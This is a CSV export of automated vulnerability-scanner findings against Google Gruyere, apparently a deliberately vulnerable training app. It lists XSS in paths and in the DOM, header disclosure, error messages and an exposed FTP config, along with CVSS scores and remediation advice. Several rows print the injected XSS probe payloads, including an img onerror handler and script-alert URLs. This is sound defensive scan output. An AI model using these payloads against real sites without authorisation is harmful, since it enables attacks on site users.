An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"f9004221-f1c3-4e40-92c2-8d3ab2470d89",2022-03-15T21:06:17.432Z,2022-03-15T16:19:07Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/%3Cscript%3Ealert(1)%3C/script%3E' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"f9fb3136-42e7-452d-8a9d-e2fb1a194e52",2022-03-15T21:06:17.432Z,2022-03-15T19:42:40Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/deletesnippet' by exploiting 'link' element named 'index' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HTTP headers sent by the remote web server disclose information that can aid an attacker, such as the server version and technologies used by the web server.","HTTP Security Header",98618,"HTTP Header Information Disclosure",,2019-06-12T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A1], cwe=[200], cve=[], cpe=[], wasc=[Information Leakage], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers, http://projects.webappsec.org/w/page/13246925/Fingerprinting",Low,"Modify the HTTP headers of the web server to not disclose detailed information about the underlying web server.",,"fb3946a9-3a12-475c-a17f-8b6d3080f788",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"The following header information disclosures have been detected on http://google-gruyere.appspot.com/361357029172560933265350706939995878846/:

- Server: Google Frontend
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"fc5b9b60-3c3b-4df2-af26-6c6e5382215e",2022-03-15T21:06:17.432Z,2022-03-15T15:45:09Z,"On https://google-gruyere.appspot.com/part1 debug error messages were detected. Please see the attached response for full details.
<b>WARNING:</b> Because Gruyere is very vulnerable",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"fd358909-c832-468a-a74b-88778f85c563",2022-03-15T18:42:41.743Z,2022-03-15T17:34:19Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload2' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"fd7ab4c1-5866-42b7-9d35-d0f5547f9015",2022-03-15T21:06:17.432Z,2022-03-15T17:02:48Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/feed.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"fe3a4dfa-72ed-4d9e-993b-35be55e541fa",2022-03-15T18:42:41.743Z,2022-03-15T17:31:07Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"febe678f-7a32-4956-bc95-5e41a2080fbf",2022-03-15T18:42:41.743Z,2022-03-15T16:53:28Z,"A response has been received with a response code '502' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TENB request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The web server on the remote host contains publicly accessible FTP configuration files. These configuration files are produced by ftp software and contain details of ftp credentials and/or hosts and other potentially sensitive information. This may be used to access content from the FTP server that might otherwise be private.","Data Exposure",113080,"FTP Credentials Disclosure",,2021-12-21T00:00:00Z,2021-12-21T00:00:00Z,"owasp_api_2019=[API3, API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A1], cwe=[538], cve=[], cpe=[], wasc=[Predictable Resource Location], bid=[]","https://filezillapro.com/docs/v3/advanced/how-to-configure-filezilla-pro-defaults-file-fzdefaults-xml/, https://codexns.io/products/sftp_for_sublime/settings",Medium,"Remove the listed FTP configuration files.",,"ff094afb-9b1f-44c5-9bcb-12af1eccbdf8",2022-03-15T21:06:17.432Z,2022-03-15T18:17:40Z,"The scanner has been able to detect a FTP settings file at https://google-gruyere.appspot.com/656501648683287335357107855369111942818/%3Cscript%3Ealert(1)%3C/FileZilla.xml.",NONE,Medium,ACTIVE
